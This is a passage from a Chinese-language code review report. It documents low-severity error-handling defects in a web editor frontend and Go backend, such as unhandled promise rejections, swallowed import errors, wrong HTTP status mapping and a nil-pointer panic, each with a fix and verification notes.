**详情**: `handleSave`(以及第 488-492 行的“包含/排除”开关)调用 `void persistSelectedPatch(...)`。`persistProjectFile` 要么在 Workspace 只读时静默返回(第 194-196 行),要么在操作被拒时抛出 `new Error(outcome.message)`(第 220 和 234 行)。由于该 promise 只被 `void` 掉,抛出的错误就变成未处理的 rejection,而组件完全不渲染任何错误状态——这个组件里根本没有 `message`/`error` 状态。

**失败场景**: 用户在只读 Workspace 中编辑 `LICENSE` 并按下 Ctrl+S(第 366 行的 `useEditorShortcut('Mod+S')` 绑定)。`persistProjectFile` 在第 194 行返回,既没有写入任何内容也没有任何提示;保存按钮保持可用,用户以为文件已保存。如果换成 outbox 拒绝该操作(revision 漂移),`throw new Error(outcome.message)` 会在控制台产生一条未处理的 promise rejection,而 UI 上仍然什么也不显示。

**修复建议**: 在 async 处理器中 await 该 promise,捕获错误并渲染到一个状态区域;同时在 `workspaceReadonly` 为 true 时显式给出只读提示/禁用保存,而不是静默无操作。

**验证备注**: 引用的证据与 ProjectFileManager.tsx 完全吻合:handleSave 位于第 291-298 行,执行 `void persistSelectedPatch(...)`;第 488-492 行的包含/排除开关做法相同;Mod+S 绑定在第 366-374 行。persistProjectFile(第 193-235 行)在 `workspaceReadonly` 时静默返回(第 194-196 行),并在第 220/234 行执行 `throw new Error(outcome.message)`;对会 reject 的 promise 使用 `void` 确实构成未处理的 rejection。拒绝路径可从真实代码到达:enqueueWorkspaceOperationOutboxAndDispatch(workspaceVfsOutboxExecutor.ts:79-85)在 Command 校验/revision 失败时返回 `rejected`,而当 IndexedDB 不可用时 store.enqueue 会抛出(indexedDbCausalOutboxStore.ts:51)。只读路径在生产中也可达(Editor.tsx:244-255 会为已同步的本地项目缓存设置 readonly),而 ProjectResources.tsx 中没有任何逻辑针对只读对该界面设门禁;与此同时,同级界面要么会呈现错误(PublicResourcePage 的 setAssetOperationError),要么会禁用控件(AnimationEditor/Blueprint)。严重度下调:用户的编辑不会丢失,`isDirty` 仍为 true,保存按钮会明显保持可用(“用户以为文件已保存”这一说法被夸大了),canonical Workspace 也不会被破坏——这是缺少反馈的 UX/错误处理缺口,而非数据丢失。

##### L-EH-03 Issues 重试没有 catch:outbox 重新入队失败会产生未处理的 rejection,且没有用户反馈

- **位置**: [`apps/web/src/editor/features/issues/WorkspaceIssuesPage.tsx:199`](apps/web/src/editor/features/issues/WorkspaceIssuesPage.tsx#L199)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `retryOperation` 用 `try { ... } finally { ... }` 包裹 `requeueFailedWorkspaceOutboxOperation`,却没有 `catch`,并且它以 `void retryOperation()` 的形式被调用(第 388 行)。如果重新入队被 reject——该执行器会读写基于 IndexedDB 的持久化 outbox——promise 的 rejection 就无人处理,`setActionMessage` 永远不会被调用,唯一可见的效果是按钮重新变为可用。用户无法区分“重试已入队”与“重试崩溃了”。

**失败场景**: 浏览器拒绝 IndexedDB 访问(隐私模式配额 / 存储回收),`requeueFailedWorkspaceOutboxOperation` 被 reject。用户选中一条 WKS-5002 问题并点击 Retry,看到加载指示消失、没有任何消息出现,而失败的操作仍然卡在 outbox 中——与此同时控制台记录了一条未处理的 promise rejection。

**修复建议**: 增加一个 `catch`,把 `actionMessage` 设置为重试失败的提示文案(并记录错误),与 `executeWorkspaceIssueQuickFix` 中的处理方式保持一致。

**验证备注**: 证据与 WorkspaceIssuesPage.tsx:196-214(try/finally,无 catch)以及第 388 行的 `onClick={() => void retryOperation()}` 吻合;setActionMessage 只在成功路径上才会执行到。拒绝路径是真实的而非假设:requeueFailedWorkspaceOutboxOperation(workspaceOutboxExecutor.ts:562-577)会 await store.get/store.update,而 IndexedDB 适配器在 factory 不可用(indexedDbCausalOutboxStore.ts:51)、打开出错(第 75-76 行)、升级被阻塞(第 77-78 行)以及事务被中止(第 41-42 行)时都会 reject——这些都没有被吞掉。既有测试(WorkspaceIssuesPage.test.tsx:248-295)只 mock 了 resolved 的 'queued' 路径,因此没有测试覆盖此情形。严重度下调:可达性很窄(WKS-5002 问题之所以存在,说明 outbox 列表读取已经成功,因此需要一次瞬时存储故障),失败的操作仍然持久排队因而不会丢失,影响只是缺少错误提示外加一条控制台级别的未处理 rejection。

##### L-EH-04 无效的 i18n 语言包导入会完全静默失败

- **位置**: [`apps/web/src/editor/features/resources/I18nResourcePage.tsx:482`](apps/web/src/editor/features/resources/I18nResourcePage.tsx#L482)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `importLocale` 通过抛出带有精确消息的 `TypeError`(`Expected a namespace object.`、`Namespace X must contain only string values.`)来校验上传的 JSON,然后在一个只有注释的空 `catch` 中把它们全部丢弃。整个导入流程中没有任何位置渲染错误状态,因此被拒绝的导入与什么都没做完全无法区分。

**失败场景**: 译者用另一款工具导出了嵌套结构或数组结构的 `zh-CN.json`,并通过 i18n 表格的文件输入导入。`JSON.parse` 成功,命名空间校验抛出异常,catch 把它吞掉,表格毫无变化。用户无从判断这次导入是静默成功但零新增键,还是因为代码早已诊断出的结构原因而被拒绝。

**修复建议**: 把抛出的消息捕获到组件的错误状态中(该页面在表格工具栏旁边已有可用空间)并渲染出来,让具体的校验消息传达给用户。

**验证备注**: 证据与文件完全吻合:I18nResourcePage.tsx:482-484 就是 `} catch { // ignore invalid json import }`,既不重新抛出、也不记录日志、也不设置任何状态。引用的 TypeError 消息原样存在(第 445 行 `Expected a namespace object.`,第 455 行 `Namespace ${namespace} must contain only string values.`)。importLocale 作为 onImport 传给 I18nResourceTable(第 535 行),并由 I18nResourcePanels.tsx:230-241 处隐藏的 <input type="file" accept="application/json,.json"> 调用;该处理器 await onImport 后对结果不做任何处理,组件也不接收任何 error prop。在这两个文件中搜索 importError/setImportError/toast/notify 均无结果,因此“导入流程中任何位置都不渲染错误状态”这一说法得到验证。该路径可从真实的生产 UI 到达:accept 过滤只约束扩展名,因此嵌套结构或数组结构的语言包 JSON 能被成功解析,随后抛进那个吞异常的 catch,使表格保持不变,与零新增键的导入无法区分。没有任何守卫、类型约束、调用方检查或测试能阻止这一点(唯一的 i18n 测试 **tests**/i18nResourceModel.test.ts 只覆盖 getTranslationStatus)。这不是对语言语义的误读。严重度维持 low:它损害的是 UX/可诊断性,不会破坏或丢失 workspace 数据;而同级的 PublicResourcePage.tsx 在类似的资产创建流程中使用了显式的 assetOperationError 界面,说明代码库本就有一套错误上报模式,只是这个流程没有采用。

##### L-EH-05 WebPluginPlatformProvider 吞掉启动阶段的 rejection,使编辑器永久停留在空白降级界面

- **位置**: [`apps/web/src/plugins/platform/WebPluginPlatformProvider.tsx:54`](apps/web/src/plugins/platform/WebPluginPlatformProvider.tsx#L54)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: 启动链路中没有任何将失败上报到 React state 的 `.catch`。只有在两条*结果形态*的失败路径(`result.ok === false`、`initialized.ok === false`)上才会走到 `setFailure`。异步函数体内任何抛出/拒绝的错误——`platformFactory` 抛错(例如在私密模式/分区上下文中 IndexedDB 不可用时的 `createWorkspaceWebPluginPlatform.ts:42` 中的 `createIndexedDbGatewayAuditStore`)、`installNativeCorePlugin` 内部 `host.discover` 拒绝,或 `created.shutdown()` 拒绝——都会让 `start` 以无任何附带信息的方式拒绝。`platform` 保持为 `undefined`,于是第 113 行永远渲染 `fallback`(默认为 `null`),而该 rejection 一直处于未处理状态,直到卸载时 effect 清理函数才最终挂上 `.catch`。

**失败场景**: 用户在 `indexedDB.open` 会抛错的浏览器配置中打开编辑器(Firefox 隐私浏览 / 被第三方 Cookie 策略阻止存储)。`createIndexedDbGatewayAuditStore` 在 `platformFactory` 内同步抛出,`start` 拒绝,`setFailure` 从未被调用,编辑器界面渲染为一片空白区域,既无提示也无重试入口——同时控制台里只有一个裸的 `unhandledrejection`。这与“仍在加载中”没有任何可区分之处。

**修复建议**: 在 `start` 链路上追加 `.catch((error: unknown) => { if (!disposed) setFailure(error instanceof Error ? error : new Error(String(error))); })`(在赋值给 `lifecycle.current` 之前),使意外抛出的错误经由与结果形态失败相同的 `failure` 路径暴露出来。

**验证备注**: 结构性缺口确实存在:WebPluginPlatformProvider.tsx:54-99 的链路中没有调用 setFailure 的 .catch,因此异步函数体内抛出/拒绝的错误会让 platform 保持 undefined 并无限期渲染 `fallback`(第 113 行),该 rejection 一直未被处理,直到清理函数在卸载时挂上 .catch。但所引用的触发条件在事实上是错的,而且我没有找到可达的生产触发路径,因此严重级别由 high 降为 low。createIndexedDbGatewayAuditStore(packages/plugin-browser/src/gateway/audit/indexedDbGatewayAuditStore.ts:40-77)只是把 globalThis.indexedDB 读入 `factory`,并把 factory.open 推迟到 openDatabase() 中,后者在首次使用时返回 Promise.reject('IndexedDB is unavailable.')——它不可能在构造时同步抛出,而 normalizeGatewayAuditRetentionPolicy 也不会抛错。默认路径上的其他每一步都是结果形态的:createWorkspaceWebPluginPlatform 对 gateway/runtime/platform 失败返回 pluginHostFailure;createTrustedPackageSource 把 digestSha256(crypto.subtle)包在 try/catch 中并返回诊断(trustedPackageSource.ts:62-80),这是现实中的非安全来源场景,并且确实会走到 setFailure;createWebPluginPlatform.shutdown() 会捕获每一个清理错误。因此该缺陷是一个没有既定失败路径的防御性错误处理漏洞,而不是可复现的编辑器空白 bug。

##### L-EH-06 main.tsx 从不处理 `initI18n()` 的 rejection,导致页面永久空白且全应用没有任何错误边界

- **位置**: [`apps/web/src/main.tsx:12`](apps/web/src/main.tsx#L12)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: 整个应用挂载都位于 `initI18n().then(...)` 之内,没有 `.catch`。`initI18n` 会 await `loadAppNamespaces(instance, ['home', 'routes'])`,后者动态导入两个 JSON chunk(apps/web/src/i18n/index.ts:74-84);chunk 加载失败会让该 promise 拒绝,`createRoot(...).render()` 永远不会被调用,`#root` 保持为空。apps/web 中也没有任何 React 错误边界——`git grep -n "componentDidCatch|ErrorBoundary|errorElement" -- apps/web/src` 无任何结果——而 react-router 内置的默认边界也无能为力,因为 router 根本没有被挂载。

**失败场景**: 一次部署替换了带哈希的资源 bundle,而用户仍缓存着旧的 `index.html`(或用户短暂离线)。对 `resources/en/home.json` 的动态导入返回 404,`initI18n()` 拒绝,用户看到一个完全空白的页面,控制台里只有一个 `unhandledrejection`——没有错误文本,没有重新加载提示,必须强制刷新。

**修复建议**: 添加一个 `.catch`,向 `#root` 渲染一个最小的静态失败外壳(提示信息加重新加载操作),并用顶层 React 错误边界包裹整棵树,使 router 之外的渲染期抛错(例如 `ThemeSync`、`AuthSessionSync`,以及 WebPluginPlatformProvider 中的 `throw failure`)不会让页面变白。

**验证备注**: main.tsx 第 12-23 行与引述证据完全吻合:整个挂载位于 `initI18n().then(...)` 之内,没有 `.catch`、没有 `try`、也没有兜底。`initI18n`(apps/web/src/i18n/index.ts:130-139)await `loadAppNamespaces(instance, ['home','routes'])`,后者会为两种受支持语言分别 await `import('./resources/<lang>/home.json')` / `routes.json`(第 74-84 行)——都是真实的 Vite 异步 chunk,因此陈旧 index.html / 离线导致的 chunk 404 确实会造成拒绝。`loadAppNamespace` 在失败时只是重新抛出(第 86-89 行);上游没有任何地方吞掉它。对 apps/web/src 全域 `git grep` componentDidCatch/ErrorBoundary/errorElement/unhandledrejection 无任何结果,而 apps/web/index.html 只有一个裸的 `<div id="root"></div>`,既无兜底标记也无全局 error/`vite:preloadError` 处理器。因此页面空白的后果是真实的。严重级别下调:这是一个罕见路径上的 UX/可用性缺口(需要 chunk 加载失败才会触发),刷新即可恢复,不涉及数据完整性或安全影响。

##### L-EH-07 图标 provider 的 `resolveExport`/`listExports` 在无保护的情况下被调用,因此抛错的官方图标模块会让 React 渲染树崩溃

- **位置**: [`apps/web/src/plugins/platform/contributions/iconProviderResolver.ts:208`](apps/web/src/plugins/platform/contributions/iconProviderResolver.ts#L208)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: `runtime.resolve` 在没有 try/catch 的情况下调用 `implementation.value.value.resolveExport(...)`,`runtime.listIcons` 也以同样方式调用 `listExports()`(第 232 行)。二者都是插件包提供的宿主模块函数。`resolve` 在渲染期同步执行:`resolveIconRef`(packages/pir-react-renderer/src/host/iconRegistry.ts:290,以及第 317 行 `DeferredIcon` 内部再次调用)从图标适配器的 `mapProps` 中调用 `provider.resolve(...)`。同级的 render-policy 解析器对等价的插件回调有意做了守卫(`renderPolicyResolver.ts:150 — } catch { return declarative; }`),因此这条路径与平台自身的失败安全契约不一致。

**失败场景**: 某个官方图标模块把 `resolveExport` 实现为一个对未映射符号会抛错的查表(例如库升级后某个导出被移除,便 `throw new Error('unknown icon')`)。某个已创作的节点仍带有 `iconRef: { provider: 'antd', name: 'DroppedIcon' }`。在 Blueprint 画布渲染期间 `resolveIconRef` → `runtime.resolve` → `resolveExport` 抛错;该异常逃出 `mapProps` 并让整个编辑器渲染栈解开,而不是降级为 `null`(文档中规定的“图标不可用”结果)。

**修复建议**: 在解析器内部把 `resolveExport` 和 `listExports` 都包进 try/catch,分别返回 `null` 和 `[]`(可选地记录诊断),与 `renderPolicyResolver.createAdapter` 中已采用的 `catch { return declarative; }` 兜底保持一致。

**验证备注**: 守卫缺失是真实的:iconProviderResolver.ts:208 调用 `implementation.value.value.resolveExport(...)`、第 232 行调用 `.listExports()`,均无 try/catch,而同级的 renderPolicyResolver.ts:150 对等价插件回调执行了 `} catch { return declarative; }`。iconProviderBridge.ts:27 把 `provider.runtime` 直接交给 `registerIconProvider`,iconRegistry.ts:215-226 未加包装地存下 `resolve`,因此 resolveIconRef(第 290 行)和 DeferredIcon(第 317 行)会让抛错逃逸进渲染。但该失败场景在已发布的代码中不可达:图标 provider 绑定被限制在经过背书的 core/official 包(officialHostImplementations.ts:376-397,且 BUILT_IN_OFFICIAL_HOST_MODULE_CATALOG 是唯一目录),而两个第一方实现对未知导出都返回 `null` 且不会抛错——packages/plugin-antd/src/hostModule.tsx:65-71(`if (!iconExports.includes(exportName)) return null;`)与 packages/plugin-mui/src/hostModule.tsx:41-49(`if (!isElementType(candidate)) return null;`)。平台对错误的*返回值*已经失败关闭(第 218 行的 `isIconComponent(resolved)`)。因此这是针对假想中未来第一方回归的防御性加固/一致性缺口,而非现存缺陷——严重级别修正为 low。

##### L-EH-08 导入中由客户端提供的非法 code/asset/project-config/design-token 文档被映射为 HTTP 500 而非 4xx 校验错误

- **位置**: [`apps/backend/internal/modules/workspace/response.go:117`](apps/backend/internal/modules/workspace/response.go#L117)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-workspace`

**详情**: `MapStoreError` 枚举了 PIR、NodeGraph、Animation、DataSource、route-manifest 和 VFS 失败的哨兵错误,但没有针对 `ErrDesignTokenValidationFailed`、`ErrDesignTokenResolverValidationFailed`,以及 `validateWorkspaceCodeDocument`、`validateWorkspaceAssetDocument` 和 `validateWorkspaceProjectConfigDocument`(store_helpers.go:410-522)返回的普通 `errors.New(...)` 值的分支。`IsWorkspaceEnvelopeError` 字符串启发式(response.go:280-286)也匹配不上这些消息,因此它们会一路落到终局的 500。提交路径不受影响,因为 `CommitWorkspaceOperation` 会把一切重新包进 `commitValidation(...)`,所以这个问题仅存在于导入路径,并且在提交测试中不可见。

**失败场景**: 以 `workspace.documents[0] = {"id":"doc_code","type":"code","path":"/main.ts","content":{"source":"x"}}`(缺少 `language`)调用 POST /api/workspaces/import-local-project。`normalizeWorkspaceDocumentContent` -> `validateWorkspaceCodeDocument` 返回 `errors.New("code document language is required")`。`MapStoreError` 匹配不到任何分支,返回 HTTP 500 `API-9001` "Could not process workspace request."。用户对一个自己完全可以修正的载荷收到了含糊的服务端错误,而该失败在监控中被记为后端 5xx。`design-tokens`(`{"$root":{}}` -> "$root must be a token")、`design-token-resolver`、`asset` 和 `project-config` 文档同理。

**修复建议**: 为每个文档内容校验器提供一个包装过的哨兵错误(例如把 code/asset/project-config 的 `errors.New` 值包进共享的 `ErrWorkspaceDocumentContentInvalid`),并在 `MapStoreError` 中为 `ErrDesignTokenValidationFailed`、`ErrDesignTokenResolverValidationFailed` 和这个新哨兵添加 `errors.Is` 分支,返回 422 `API-1001`。哨兵就位后即可删除 `IsWorkspaceEnvelopeError` 这一字符串匹配启发式。

**验证备注**: 无法证伪该映射分析。我完整阅读了 MapStoreError(response.go:12-118):它对 WorkspaceRevisionConflictError、ErrWorkspaceNotFound、ErrWorkspaceDocumentNotFound、三个 asset-blob 哨兵、ErrWorkspaceCommitIdentityMismatch、workspaceRevisionLimitError、WorkspaceOperationCommitValidationError、json.SyntaxError、patch 哨兵、ErrWorkspaceVFSInvalid、RouteManifestValidationError、ErrPIRValidationFailed 以及 ErrNodeGraph/Animation/DataSourceValidationFailed 做了分支。既没有针对 ErrDesignTokenValidationFailed 或 ErrDesignTokenResolverValidationFailed 的分支(二者定义于 design_token_document_validator.go:11-12 并在各处以 %w 包装),也没有针对 validateWorkspaceCodeDocument / validateWorkspaceAssetDocument / validateWorkspaceProjectConfigDocument(store_helpers.go:410-521)返回的裸 errors.New 值的分支。IsWorkspaceEnvelopeError(response.go:274-286)只匹配 "command."/"patch operation" 前缀以及 target/expected* 子串,因此上述消息一个都匹配不上,最终抵达 response.go:117 处终局的 500 API-9001。json.SyntaxError 也捕获不到它们,因为载荷本身解析正常。导入确实是唯一暴露路径(normalizeWorkspaceDocumentContent 只有一个非测试调用方,store_snapshot.go:84),而 handlers.go:205-208 把错误原样交给 MapStoreError;提交路径重新包进 commitValidation,所以它确实在提交路径上不可见。严重级别由 medium 修正为 low:唯一后果是对一个客户端可自行修正的载荷返回了错误的状态码和消息形态。没有数据损坏、没有授权影响、没有持久化影响;请求无论如何都会被拒绝。这属于 API 契约/可观测性噪声。

##### L-EH-09 PutSnapshot 把 workspace 归属探测上的瞬时数据库故障报告为永久性 404

- **位置**: [`apps/backend/internal/modules/environment/store.go:199`](apps/backend/internal/modules/environment/store.go#L199)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: workspace 归属探测把 `err != nil` 和 `owner mismatch` 合并为同一个 `ErrNotFound`。`respondStoreError`(handler.go:70)把 `ErrNotFound` 映射为 `404 ENV-4004` 且不带可重试提示,而真正的 store 不可用本应表现为 `503 ENV-5001` 并带 `WithRetryable(true)`。因此连接重置、语句超时,或 5 秒的 `databaseContext` 截止时间在查询中途到期,都与“该 workspace 不存在”无法区分。

**失败场景**: 在一次短暂的 Postgres 故障切换期间,客户端 PUT 一份 environment snapshot。`tx.QueryRowContext(...).Scan(&workspaceOwner)` 返回 `driver.ErrBadConn`,客户端收到 `404 ENV-4004 "Execution environment was not found."` 且没有可重试标记。把 404 当作权威结论的客户端会断定该 workspace 已不存在并停止重试(或重新引导),而不是像面对同一 store 对 `ErrUnavailable` 返回的 503 那样执行退避。

**修复建议**: 把两种情形分开:仅对 `sql.ErrNoRows` 或归属不匹配返回 `ErrNotFound`,其他错误一律向上传播(从而让 `respondStoreError` 落入可重试的 503 分支)。

**验证备注**: 已验证。store.go:199 写的是 `if err := tx.QueryRowContext(...).Scan(&workspaceOwner); err != nil || workspaceOwner != input.Principal.PrincipalID { return nil, ErrNotFound }`——与引述完全一致——把驱动错误、语句超时和 5 秒 databaseContext 截止时间(store.go:163-165)统统折叠为 ErrNotFound。respondStoreError(handler.go:70-71)把 ErrNotFound 映射为 404 ENV-4004 且不带 WithRetryable,而真正的不可用会产出 503 ENV-5001 WithRetryable(true)(handler.go:68-69 以及 76-78 的默认分支,后者正是两行之前的裸 BeginTx 错误会走到的地方)。这种不一致就出现在同一个文件内部:store.go:262-267 的 GetSnapshot 在返回前正确地把 sql.ErrNoRows 与其他错误区分开来,说明这是一处疏漏而非有意策略。把归属不匹配折叠进 not-found 是合理的反枚举取舍,但把 `err != nil` 一并折叠进去则不是。严重级别 low 是恰当的——它会在瞬时数据库故障期间劣化客户端重试行为,但不会破坏数据或突破授权。

##### L-EH-10 当配置的基础 URL 解析失败时 normalizedServiceBaseURL 解引用了 nil 的 *url.URL

- **位置**: [`apps/backend/internal/modules/remoteexecution/handler.go:175`](apps/backend/internal/modules/remoteexecution/handler.go#L175)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-remoteexec-integrations`

**详情**: url.Parse 对畸形输入返回 (nil, err),但第 175 行在第 176 行的 err != nil 守卫之前就求值了 parsed.Hostname()。Hostname() 会解引用 u.Host,因此解析失败会 panic,而不是像该函数对其他所有非法情形所设计的那样返回空字符串。这段代码在 NewHandler 内部于组合期执行(第 203、207 行,以及经由 normalizedPublicBaseURL 的第 208 行),因此该 panic 会杀死进程启动,而不是降级到 available() / previewAvailable() 为空基础 URL 所实现的 503 'gateway unavailable' 预期路径。

**失败场景**: 部署设置了 REMOTE_RUNNER_BASE_URL=http://runner:$PORT(占位符未展开)或任何带非法端口或控制字符的值。url.Parse 返回 nil 加一个错误,第 175 行在这个 nil URL 上调用 Hostname(),后端在构建路由时 panic,而不是以远程执行 gateway 标记为不可用的状态启动。

**修复建议**: 在 url.Parse 之后立即以 if err != nil || parsed == nil { return "" } 提前返回,然后再计算 loopback。

**验证备注**: handler.go:172-180 与引述证据吻合。我用一个临时程序实证确认了 Go 语义:url.Parse("http://runner:$PORT") 返回 (nil, "invalid port"),url.Parse("http://a\x7fb") 返回 (nil, "invalid control character"),而在返回的 nil 结果上调用 Hostname() 会以 'invalid memory address or nil pointer dereference' panic。由于第 175 行在第 176 行的 err != nil 守卫之前就求值 parsed.Hostname(),畸形的配置 URL 会 panic 而不是返回 ""。注意 url.Parse("") 会成功并返回非 nil 的零值 URL,因此未设置/默认情形是安全的——只有畸形的非空值才会触发。config.go 的校验只检查 token 配对(REMOTE_RUNNER_CONTROL_PLANE_TOKEN / REMOTE_PREVIEW_HOST_TOKEN),从不解析该 URL,因此上游没有任何东西能拦住它。normalizedServiceBaseURL 仅由 NewHandler(第 203、207 行)和 normalizedPublicBaseURL(第 208 行)调用,即在组合期,因此该 panic 中止的是启动而非某个请求。严重级别由 medium 修正为 low:它需要运维配置错误才会触发,属于快速失败且可立即诊断,不会造成数据损坏或按请求的拒绝服务。

##### L-EH-11 WorkspaceAssetBlobMaintenance.Start 缺少同类实现具备的间隔守卫,SweepInterval 为零会让未被恢复的 goroutine panic;Close 还会残留已设置的状态

- **位置**: [`apps/backend/internal/app/workspace_asset_blob_maintenance.go:67`](apps/backend/internal/app/workspace_asset_blob_maintenance.go#L67)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-platform`

**详情**: 同一生命周期中存在两个缺陷。(1) `Start` 只校验 `store != nil`,而同类的 `EnvironmentSecretKeyRotationMaintenance.Start`(environment_secret_key_rotation_maintenance.go:40)显式守卫了 `config.RotationInterval <= 0`。`run` 随后在第 87 行调用 `time.NewTicker(maintenance.config.SweepInterval)`,该调用在时长非正时会 panic。panic 发生在一个裸 goroutine 上,gin.Recovery 无法捕获,整个进程随之死亡。`backend.NewServer` 与 `app.NewRuntimeModules` 都是导出的,并接受任意 `config.Config`,因此任何不经过 `config.LoadConfig` 的调用方(测试框架、嵌入式使用、未来的入口点)都会触及此问题。(2) `Close` 读取 `cancel`/`done`,却从不重置 `started`、`cancel` 或 `done` —— 与第 71-73 行的同类实现不同 —— 因此后续的 `Start` 会看到 `started == true` 并直接返回,不再重新启动循环。

**失败场景**: 某调用方构造 `backend.NewServer(config.Config{Address: ":8080", DatabaseURL: url})`(AssetBlobRetention 为零值)。NewServer 成功返回;第一次 `Run()` 调用到达 `StartMaintenance`,清扫 goroutine 执行 `time.NewTicker(0)` 并以 "non-positive interval for NewTicker" panic,直接杀死整个 HTTP 服务器。另外,在同一实例上先调用 `Close()` 再调用 `Start()`,会让孤儿 blob 保留清理被永久禁用,且没有任何错误提示和日志输出。

**修复建议**: 对齐同类实现:在 Start 的守卫中加入 `|| maintenance.config.SweepInterval <= 0 || maintenance.config.WorkspaceLimit <= 0 || maintenance.config.BlobLimit <= 0`,并在 Close 释放互斥锁之前设置 `started = false; cancel = nil; done = nil`。

**验证备注**: 该主张一半被证伪,一半成立。已证伪:NewTicker(0) 的 panic 在生产中不可达。config.go:223 通过 getEnvPositiveDuration 解析 BACKEND_ASSET_BLOB_SWEEP_INTERVAL(对 <=0 失败关闭),config.go:377 的 validateOptionalCapabilities 会显式返回 "BACKEND_ASSET_BLOB_SWEEP_INTERVAL must be positive",因此 LoadConfig 永远不可能产出 SweepInterval == 0。git grep 显示 backend.NewServer 的唯一调用方是 apps/backend/cmd/server/main.go:15,它始终走 backendconfig.LoadConfig();NewRuntimeModules 只在 server.go:56 被调用。审查者所说的"测试框架、嵌入式使用、未来的入口点"这类调用方在仓库中并不存在,因此所声称的进程死亡只是假设,medium 严重级别站不住脚。已确认:代码事实准确 —— Start(第 45 行)只检查 store != nil,而同类的 EnvironmentSecretKeyRotationMaintenance.Start(environment_secret_key_rotation_maintenance.go:40)还守卫了 config.RotationInterval <= 0;Close(第 67-79 行)读取 cancel/done 却从不重置 started/cancel/done,而同类实现在第 71-73 行做了重置。这种不对称是真实且可验证的潜伏缺陷:先 Close 再 Start 会静默变成空操作。它今天处于休眠状态,因为唯一的生命周期是 Run() -> StartMaintenance 一次,以及进程退出时的 Close();不存在重启路径。下调为 low:属于休眠的健壮性/纵深防御缺口,没有可达的故障。

##### L-EH-12 当 workspace Command 移除 /routeManifest 时,applyWorkspaceCommand 抛出 TypeError 而不是返回 issues

- **位置**: [`packages/workspace/src/workspaceCommand.ts:851`](packages/workspace/src/workspaceCommand.ts#L851)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace`

**详情**: `isAllowedWorkspacePath` 针对 workspace 域的 Command 显式把 `path === '/routeManifest'` 列入白名单(第 701 行),而 `removeValue` 会从克隆出的 snapshot 中删除该键。补丁后的关口 `validateWorkspaceTransition` 随即调用 `findMissingRouteDocumentRefs`,其第一条语句就在毫无守卫的情况下解引用 `snapshot.routeManifest.root`。`validateWorkspaceSnapshot` 也完全不校验 `routeManifest`,因此该路径上唯一接触它的代码就是这处无守卫的解引用。Canonical 写入边界在契约上是一个失败关闭、返回 `{ ok: false, issues }` 的函数;而这里它却以从调用中抛出异常的方式失败。

**失败场景**: 调用 `applyWorkspaceCommand(snapshot, { id:'c1', namespace:'core.workspace', type:'route.reset', version:'1.0', issuedAt:'...', domainHint:'workspace', target:{ workspaceId: snapshot.id }, forwardOps:[{ op:'remove', path:'/routeManifest' }], reverseOps:[{ op:'add', path:'/routeManifest', value: snapshot.routeManifest }] })`。路径校验通过(在白名单内),前向补丁移除该键,反向补丁又将其恢复,因此可逆性检查也通过,随后 `validateWorkspaceTransition(nextSnapshot)` 在 `routeManifest` 已变为 `undefined` 的对象上执行 `nextSnapshot.routeManifest.root` -> `TypeError: Cannot read properties of undefined (reading 'root')` 逃逸出 `applyWorkspaceCommand`,使编辑器 store / outbox 执行器崩溃,而不是产出 `WKS_COMMAND_VALIDATION_FAILED`。与之相邻的 `{op:'replace', path:'/routeManifest', value:'oops'}` 不会抛异常,却会被当作有效接受,把一个非 manifest 的值写入 Canonical snapshot。

**修复建议**: 在解引用之前先守卫 manifest 本身(`const manifest = snapshot.routeManifest; if (!manifest || typeof manifest !== 'object') return [...]`),并在 `validateWorkspaceSnapshot` 中加入 `routeManifest` 的形状检查,使被移除/损坏的 manifest 变成 `WKS_COMMAND_VALIDATION_FAILED` issue,而不是抛异常或静默接受。

**验证备注**: 通过执行真实代码验证(针对 packages/workspace 的临时 vitest 用例):一条 workspace 域 Command,其 forwardOps 为 [{op:'remove',path:'/routeManifest'}] 并带有匹配的反向操作,能通过白名单(workspaceCommand.ts:701 将 '/routeManifest' 列入白名单)、通过可逆性检查,然后从 applyWorkspaceCommand 抛出 "TypeError: Cannot read properties of undefined (reading 'root')" —— findMissingRouteDocumentRefs(第 848-851 行)在其 `routeRoot` 守卫之前就解引用了 snapshot.routeManifest,而 validateWorkspaceVfs.ts 中完全没有 routeManifest 校验。相邻用例 {op:'replace',path:'/routeManifest',value:'oops'} 确实返回 ok:true。因此该机制真实存在。但严重级别被夸大:(a) 没有任何生产 planner 会发出对整个 /routeManifest 的 remove —— 每个生产方(workspaceRouteIntentCommand.ts:126、prodivix-compiler workspaceProject.ts:725、vue/workspaceApp.ts:298)都使用 `replace` 并带上由 codec 产出的 manifest;(b) 插件/AI 没有任何 API 可以提交原始的 WorkspaceCommandEnvelope(在 apps/web/src/plugins 或 packages/plugin-contracts 中都找不到 WorkspaceCommandEnvelope 的引用);(c) 真实的编辑器派发路径 apps/web/src/editor/workspaceSync/workspaceVfsOutboxExecutor.ts 用 try/catch 包裹 state.dispatchWorkspaceCommand,把抛出的异常转换为拒绝并移除 outbox 条目,而 packages/workspace-sync/src/workspaceOperationCommit.ts 中的 applyPersistentWorkspaceOperation 也用 try/catch 包裹其 applyWorkspaceCommand 调用,并额外对结果运行 decodeRouteManifest,同样会拒绝一个垃圾 manifest。这是失败关闭 API 中真实的失败放行,但今天不存在数据损坏或崩溃路径:low。

##### L-EH-13 RouteManifest codec 接受 parentRouteNodeId 位于某个 module 内部的 mount,随后组合阶段静默丢弃该 mount

